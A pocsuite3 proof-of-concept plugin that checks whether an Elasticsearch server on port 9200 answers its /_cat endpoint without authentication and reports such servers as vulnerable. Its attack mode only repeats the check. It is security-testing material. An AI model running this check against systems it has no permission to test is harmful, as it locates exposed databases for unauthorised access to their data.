#!/usr/bin/env python
#_*_ encoding: utf-8 _*_

from pocsuite3.api import Output, POCBase, register_poc, requests

class Elasticsearch(POCBase):
    vulID = '62520'
    version = '1.0'
    author = ['big04dream']
    vulDate = '2013-11-20'
    createDate = '2019-10-11'
    updateDate = '2019-10-11'
    references = ['https://www.seebug.org/vuldb/ssvid-62520']
    name = 'Elasticsearch Unauthorized access'
    appPowerLink = 'http://www.elasticsearch.cn/'
    appName = 'elasticsearch'
    appVersion = 'all'
    vulType = 'Unauthorized access'
    desc = '''
    Elasticsearch Unauthorized access
    '''
    
    def _verify(self):
        result = {}
        try:
            u = self.url
            port = 9200
            url = u + ':' + str(port) + '/_cat'
            response = requests.get(url)
            if response.status_code == 200 and '/_cat/master' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = url
        except:
            pass
        return self.parse_output(result)
    
    def _attack(self):
        return self._verify()
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output
    
register_poc(Elasticsearch)